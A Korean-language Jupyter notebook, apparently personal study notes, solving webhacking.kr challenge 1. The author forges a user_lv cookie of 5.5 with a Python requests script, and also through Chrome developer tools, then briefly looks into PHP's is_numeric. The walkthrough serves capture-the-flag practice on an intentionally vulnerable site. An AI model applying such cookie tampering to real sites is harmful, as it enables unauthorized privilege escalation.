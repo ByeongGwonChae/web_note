{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# 문제\n",
    "\n",
    "소스코드를 보면 user_lv쿠키값을 1로 주고선, 다음 조건(5 < user_lv < 6) 을 만족시켜야만 풀리는 문제다.\n",
    "<br>\n",
    "이 문제가 요구하는 것은 쿠키를 다룰줄 아느냐는 것이다.\n",
    "\n",
    "![1](img/01-01.PNG)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# 풀이 1번\n",
    "\n",
    "python으로는 다음과 같이 풀 수 있다.\n",
    "requests모듈을 사용하였다."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "200\n",
      "\n",
      "\n",
      "\n",
      "<html>\n",
      "<head>\n",
      "<title>Challenge 1</title>\n",
      "</head>\n",
      "<body bgcolor=black>\n",
      "<center>\n",
      "<br><br><br><br><br>\n",
      "<font color=white>\n",
      "---------------------<br>\n",
      "<script>alert('already solved');</script><br>level : 5.5<br>\n",
      "<a href=./?view-source=1>view-source</a>\n",
      "</body>\n",
      "</html>\n",
      "\n"
     ]
    }
   ],
   "source": [
    "with requests.Session() as s:\n",
    "    #일단 webhacking.kr에 로그인한 다음에\n",
    "    data = {'id':'new_ch','pw':'0123'}\n",
    "    statuscode = s.post('https://webhacking.kr/login.php/?login', data=data)\n",
    "    print(statuscode.status_code)\n",
    "    \n",
    "    print('\\n\\n')\n",
    "    \n",
    "    #user_lv쿠키값을 입력하고 1번문제 URL로 접속한다\n",
    "    r = s.get('https://webhacking.kr/challenge/web-01/', cookies={\"user_lv\":'5.5'})\n",
    "    print(r.text)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# 풀이 2번 \n",
    "\n",
    "크롬 개발자 도구를 이용해서 풀어도 된다.\n",
    "[크롬]-[F12]-[Application]-[Cookies] 경로로 들어가서 원하는 쿠키값을 생성/변경/삭제 가능하다."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "![2](img/01-02.PNG)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "다음과 같이 user_lv 쿠키를 찾아서 Value를 변경시킨 다음에 새로고침해주면 문제가 풀린다."
   ]
  },
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "![3](img/01-03.PNG)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "이미 python으로 푼 문제라서 \"already solve\" 라고 나오는데 원래는 \"pwned!\"인가 하는 글이 나온다. 이런식으로 글 쓰는게 오랜만이라서 처음 문제 풀었을 때의 화면을 찍지 못해서 아쉽다."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# 기타\n",
    "\n",
    "python으로 문제를 풀었을 때 user-lv 값을 문자열로 줬는데, php의 is_numeric함수를 잘 통과한 것 같다. php가 숫자형태를 가진 문자열을 변수로 가질 때, 그냥 문자열로 사용되는지 아니면 숫자로 변환되는지 잘 모르겠어서 한 번 실험 해봤는데,"
   ]
  },
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "![4](img/01-04.PNG)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "음.. 숫자로 변환되는 것 같다."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3.7.6 64-bit ('test1': conda)",
   "language": "python",
   "name": "python37664bittest1conda6096207d9ba848ecb47f4c96b52d76b2"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.6"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
